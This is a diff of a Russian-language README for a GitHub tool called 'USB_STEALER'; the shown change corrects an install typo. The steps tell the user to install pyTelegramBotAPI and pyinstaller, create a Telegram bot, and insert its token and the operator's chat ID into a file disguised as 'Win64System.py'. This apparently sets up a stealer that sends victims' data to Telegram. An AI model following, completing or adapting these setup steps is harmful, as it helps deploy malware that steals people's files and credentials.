@@ -5,7 +5,7 @@ github :: https://github.com/sblrocheeek/USB_STEALER
 2) Пропишите следующие команды в cmd (ОБЯЗАТЕЛЬНО):
  pip install pyTelegramBotAPI
  pip install shutil
- pip instaall pyistaller
+ pip instaall pyinstaller
 3) Создайте тг бота в :: https://t.me/BotFather
 4) Зайдите в файл Win64System.py и вставьте в token(10 строка) свой токен от бота (которого вы создали в https://t.me/BotFather)
 5) Узнайте свой id телеграма и вставьте его в me(11 строка) (id можно посмотреть в https://t.me/getmyid_bot)
